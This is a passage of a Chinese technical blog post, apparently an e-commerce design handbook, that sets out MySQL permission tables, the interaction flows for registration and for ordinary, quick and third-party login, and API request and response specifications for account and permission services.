class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`ms_id`</span> <span class="built_in">smallint</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统id'</span>,</span><br><span class="line">    <span class="string">`parent_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'父菜单id'</span>,</span><br><span class="line">    <span class="string">`menu_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'菜单名称'</span>,</span><br><span class="line">    <span class="string">`menu_desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'菜描述'</span>,</span><br><span class="line">    <span class="string">`menu_uri`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'菜单uri'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`is_show`</span> enum(<span class="string">'yes'</span>,<span class="string">'no'</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'no'</span> <span class="keyword">COMMENT</span> <span class="string">'是否展示菜单'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_ms_id`</span> (<span class="string">`ms_id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_parent_id`</span> (<span class="string">`parent_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'系统menu'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统权限</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_item`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`ms_id`</span> <span class="built_in">tinyint</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统id'</span>,</span><br><span class="line">    <span class="string">`menu_id`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'页面/接口uri'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_ms_menu`</span> (<span class="string">`ms_id`</span>, <span class="string">`menu_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'系统权限'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统权限(权限的各个集合)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_role`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'角色名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'角描述'</span>,</span><br><span class="line">    <span class="string">`auth_item_set`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'权限集合 多个值,号隔开'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'员工角色'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 角色与员工关系</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_role_staff`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`staff_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'员工id'</span>,</span><br><span class="line">    <span class="string">`role_set`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'角色集合 多个值,号隔开'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_staff_id`</span> (<span class="string">`staff_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'权限角色与员工关系'</span>;</span><br></pre></td></tr></table></figure><h2 id="交互设计"><a href="#交互设计" class="headerlink" title="交互设计"></a>交互设计</h2><blockquote><p>友情提示：一大波图片即将到来，此处图片较多，不清楚的可点击大图查看</p></blockquote><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>注册成功之后存在至少两种交互方式：</p><ol><li>注册成功 -&gt; 跳转到登录页面</li><li>注册成功 -&gt; 自动登录 -&gt; 跳转到应用首页(或者其他页面)</li></ol><p>具体交互流程如下：</p><p><img src="/articles/电商设计手册/skr-account-register-bmpr.png" alt><br><img src="/articles/电商设计手册/skr-account-register.jpg" alt><br><img src="/articles/电商设计手册/skr-account-register-result-2.png" alt> </p><hr><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><h4 id="普通登录"><a href="#普通登录" class="headerlink" title="普通登录"></a>普通登录</h4><p><img src="/articles/电商设计手册/skr-account-login-page.png" alt><br><img src="/articles/电商设计手册/skr-account-login-logic.jpg" alt><br><img src="/articles/电商设计手册/skr-account-home-page.png" alt></p><h4 id="快捷登录"><a href="#快捷登录" class="headerlink" title="快捷登录"></a>快捷登录</h4><p>快捷登录的流程基本和上面一致只是验证密码换成了验证验证码。</p><p><img src="/articles/电商设计手册/skr-account-simple-login-page.png" alt></p><hr><h4 id="第三方登录"><a href="#第三方登录" class="headerlink" title="第三方登录"></a>第三方登录</h4><p>第三方登录的交互其实存在这样的问题：</p><ol><li>第三方账户登录成功后还需要绑定手机号/Email吗？</li></ol><p>因为我发现有些PM为了提高用户使用的简单快捷性，往往第三方登录成功后会直接产生uid，而不进行账号的绑定。这样之后在再进行账号绑定就涉及账号合并的问题，很麻烦(如果有钱包等)。如果我们一开始就进行绑定操作，这样未来账号的关系就清晰明了便于维护，第三方登录其实就相当于普通账号的别名。<br>最后这个事情做不做的结果就是，账户表account_user和第三方用户信息表account_platform是的<strong>一对多</strong>还是<strong>一对一</strong>的关系。</p><ol start="2"><li>如果绑定，已经注册的手机号/Email是否可以绑定？</li></ol><p>这个还好说，一般来说绑定的选择基本是正确的。最后具体的流程图如下：</p><p><img src="/articles/电商设计手册/skr-account-platform-login.jpg" alt></p><p>交互界面图如下： </p><p><img src="/articles/电商设计手册/skr-account-platform-login-page.png" alt></p><hr><h3 id="后台权限管理"><a href="#后台权限管理" class="headerlink" title="后台权限管理"></a>后台权限管理</h3><p>首先，我们的后台管理系统需要个响亮的称号，想了一会以前公司用过apollo,于是我准备用mars但突然冒出来个earth，地球万物之根，刚好我们这又是个全业务的基础服务管理系统，哈哈就这样吧～ <strong>Earth System</strong></p><p><strong>Earth System</strong>的权限管理功能主要分为以下四部分：</p><ul><li>系统管理(The manage system page)<ul><li>编辑页面</li><li>列表页面</li></ul></li><li>菜单管理(The menu page)<ul><li>编辑页面</li><li>列表页面</li></ul></li><li>角色管理(The role page)<ul><li>编辑页面</li><li>列表页面</li></ul></li><li>员工与角色关联管理(The role staff map page)<ul><li>编辑页面</li><li>列表页面</li></ul></li></ul><p>具体交互如下：</p><p><img src="/articles/电商设计手册/skr-earth-2.jpg" alt></p><hr><h2 id="接口设计"><a href="#接口设计" class="headerlink" title="接口设计"></a>接口设计</h2><h3 id="应用层接口-对外"><a href="#应用层接口-对外" class="headerlink" title="应用层接口(对外)"></a>应用层接口(对外)</h3><p>1.注册接口</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>username</td><td>string</td><td>非必传</td><td>用户账号</td></tr><tr><td>email</td><td>string</td><td>email/phone两者择一</td><td>用户邮箱</td></tr><tr><td>phone</td><td>string</td><td>email/phone两者择一</td><td>用户手机号</td></tr><tr><td>code</td><td>int</td><td>必传</td><td>验证码</td></tr></tbody></table><p>交互方式一(跳转到登录页面)响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交互方式二(跳转到首页页面)响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.登录接口</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>username</td><td>string</td><td>username/email/phone三者择一</td><td>用户账号</td></tr><tr><td>email</td><td>string</td><td>username/email/phone三者择一</td><td>用户邮箱</td></tr><tr><td>phone</td><td>string</td><td>username/email/phone三者择一</td><td>用户手机号</td></tr><tr><td>password</td><td>string</td><td>必传</td><td>密码</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.快捷登录接口</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>email</td><td>string</td><td>email/phone两者择一</td><td>用户邮箱</td></tr><tr><td>phone</td><td>string</td><td>email/phone两者择一</td><td>用户手机号</td></tr><tr><td>code</td><td>int</td><td>必传</td><td>验证码</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.第三方登录接口</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>type</td><td>string</td><td>必传</td><td>平台类型 1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter</td></tr><tr><td>platform_id</td><td>string</td><td>必传</td><td>第三方平台用户ID</td></tr><tr><td>platform_token</td><td>string</td><td>必传</td><td>第三方平台令牌</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.用户信息修改接口</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>username</td><td>string</td><td>非必传</td><td>用户账号</td></tr><tr><td>nickname</td><td>string</td><td>非必传</td><td>昵称</td></tr><tr><td>avatar</td><td>string</td><td>非必传</td><td>头像url</td></tr><tr><td>gender</td><td>string</td><td>非必传</td><td>用户性别，male:男，female:女，other:未知</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6.用户登录状态校验</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>s_token</td><td>string</td><td>必传</td><td>用户会话标示</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期， -1登录失效"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务接口-基础服务，对内"><a href="#服务接口-基础服务，对内" class="headerlink" title="服务接口(基础服务，对内)"></a>服务接口(基础服务，对内)</h3><p><strong>账户服务：</strong></p><ol><li>注册</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>username</td><td>string</td><td>非必传</td><td>用户账号</td></tr><tr><td>email</td><td>string</td><td>email/phone两者择一</td><td>用户邮箱</td></tr><tr><td>phone</td><td>string</td><td>email/phone两者择一</td><td>用户手机号</td></tr></tbody></table><p>交互方式一(跳转到登录页面)响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"uid"</span>: <span class="string">"string, 账户ID"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>登录</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>username</td><td>string</td><td>非必传</td><td>用户账号</td></tr><tr><td>email</td><td>string</td><td>email/phone两者择一</td><td>用户邮箱</td></tr><tr><td>phone</td><td>string</td><td>email/phone两者择一</td><td>用户手机号</td></tr><tr><td>password</td><td>string</td><td>必传</td><td>密码</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"uid"</span>: <span class="string">"string, 账户ID"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>第三方登录</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>type</td><td>string</td><td>必传</td><td>平台类型 1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter</td></tr><tr><td>platform_id</td><td>string</td><td>必传</td><td>第三方平台用户ID</td></tr><tr><td>platform_token</td><td>string</td><td>必传</td><td>第三方平台令牌</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"uid"</span>: <span class="string">"string, 账户ID"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>权限服务</strong></p><ol><li>获取系统菜单</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>ms_id</td><td>string</td><td>必传</td><td>系统ID</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span 